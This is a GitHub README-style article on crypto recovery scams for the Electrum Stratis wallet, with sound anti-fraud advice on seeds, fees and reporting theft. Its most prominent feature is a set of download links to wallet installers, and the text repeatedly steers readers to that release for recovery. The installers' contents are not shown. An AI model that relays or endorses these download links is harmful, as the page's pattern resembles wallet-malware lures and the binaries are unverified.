![Electrum-Stratis](https://github.com/electrum-stratis-project/electrum-stratis-recovery/raw/main/assets/banner-article.png)

# Crypto recovery scams: what no app, service or DM can do

<p align="center">Why the offer is the evidence</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=windows&logoColor=ecf3f8"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ecf3f8"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ecf3f8"></a></p>

<div align="center">

| Platform | File |
| --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=windows&logoColor=ecf3f8"> | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ecf3f8"> | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ecf3f8"> | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

No app, service, "recovery expert" or direct message can recover funds from a self-custody wallet, because recovery is a local operation: a seed restore or a candidate-password search that you run yourself. On-chain transfers are irreversible, and stolen funds are pursued through a police report and exchange cooperation, not through a paid service. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and its own recovery flows never require sending recovery material to anyone.

## You'll see this if

| What you are looking at | What it really is | What to do |
|---|---|---|
| A comment or DM after you post "lost password" or "missing funds" | A scripted approach to a public problem | Stop replying; do not send the file |
| A "recovery app" with a download button | Either malware or a paid wrapper around a search you can run free | Close it; run the wallet's own search |
| A service asking for the seed "to verify ownership" | The seed is the wallet; handing it over hands over the funds | Never send it, to anyone |
| An upfront fee, then a request for more | Advance-fee fraud, the most common variant | Do not pay; keep the messages |
| A page promising funds back within 24 hours | No process can reverse a confirmed transfer | Report the page; warn the community |

Recovery fraud works because the loss is real and urgent. The scam does not need to break encryption; it only needs the victim to believe that someone else has a capability the wallet does not.

## Why it happens

Two properties of a self-custody wallet create the opening. First, a confirmed transaction cannot be reversed by anyone  -  there is no chargeback, no support desk with a reversal button, and no administrator who can move coins back. Second, the only objects that can restore a wallet are the seed and the wallet file, both of which are in the user's hands. That combination means anyone claiming an ability to recover is either mistaken or lying.

Scammers read the same forums users do. A post describing a lost password, a missing balance or a failed sweep is a list of people to contact privately, and the approach is almost always the same: sympathy, then a small fee, then a request for the file, the seed or remote access. Once the file or seed is in someone else's hands, the funds are gone and the conversation ends.

The legitimate version of recovery looks unglamorous: restore from the seed in the wallet window, or run the wallet's offline search over candidate passwords on your own machine. The unglamorous version is also the maintained one: the wallet's current release, on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), carries the offline password search and the restore flow itself, with no third party in the loop.

## Fix

1. **Establish what you actually hold before talking to anyone.** A seed, a wallet file with a password, a raw private key, or nothing. The backup-model detector in Electrum Stratis names which one it sees before it asks for anything, and that name decides the route.
2. **Run the legitimate route yourself.** With a seed, use the legacy seed restore and confirm the address preview before committing. With only a file, run the offline password search and read its odds honestly. Neither route needs a third party, a fee or an internet connection.
3. **If funds were actually stolen, treat it as a crime, not a purchase.** Write down the transaction IDs, the addresses, the times and every message exchanged. Report it to the police in your jurisdiction and to the exchange where the funds were bought; exchanges can act on a lawful request in a way that no private "recovery agent" can.
4. **If you are being approached right now, stop the conversation.** Do not send a file, a seed, a screenshot of a seed, remote-access software or a payment. Keep the messages as evidence, and report the account on the platform where the approach happened.
5. **Warn the thread you posted in.** The next person with the same problem will receive the same message; a public note that the approach is a scam is the only thing that reduces the number of victims.

A wallet restored from a seed does not need the old password, and a wallet restored from a file does not need a service. There is no third path, and no amount of money buys one.

## If that did not work

If the legitimate routes fail, the remaining options are honesty and time. A seed that does not restore the expected addresses usually means a different derivation or a different wallet lineage (the [Qt wallet has no seed at all](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)), not a lost cause  -  check the address preview against a known address before concluding anything. If the wallet opens but the balance looks wrong, that is a [different problem in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md). A file whose password is not in the candidate set stays closed, and it is worth keeping for the day a password surfaces.

What does not help: paying a second service after the first one failed, installing a "recovery" tool that asks for the file, or moving remaining funds into a wallet someone else set up. Each of those turns one loss into two.

## Prevention

- Treat any unsolicited recovery offer as fraud by default, including offers that arrive in a thread where you asked for help.
- Never share a seed, a private key, a wallet file or a screenshot of any of them; no legitimate process needs them.
- Keep the seed offline and the wallet file backed up separately, so a lost password is an inconvenience rather than a loss.
- Test a restore before the wallet holds meaningful funds.
- When posting publicly about a loss, leave out addresses and any detail that identifies your wallet.

## FAQ

### How do I recover stolen crypto funds?

In practice, through a police report and the exchange or platform where the funds were bought or cashed out, with transaction IDs and dates as evidence. A confirmed transfer cannot be reversed, and no private service can reverse it either; be cautious of anyone who says otherwise for a fee.

### Is there wallet recovery software?

There is software that tests candidate passwords against a wallet file locally, and that is the only legitimate form of it. There is no software that derives an unknown password, restores a wallet without a seed or file, or pulls funds back from an address. Anything sold as the second kind is fraud or malware.

### Someone on Reddit offered to help me recover my wallet. Is that legitimate?

No. Legitimate help is public, general and free: a restore procedure, a search method, an explanation. Anyone who moves the conversation to DMs and asks for a file, a seed or a fee has described the fraud pattern exactly.

### Should I restore a wallet with an empty password?

An empty password leaves the wallet file unencrypted, so anyone who obtains the file obtains the funds. Use a passphrase you can retype. The seed is the backup, not the password, and a strong password costs nothing to set.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
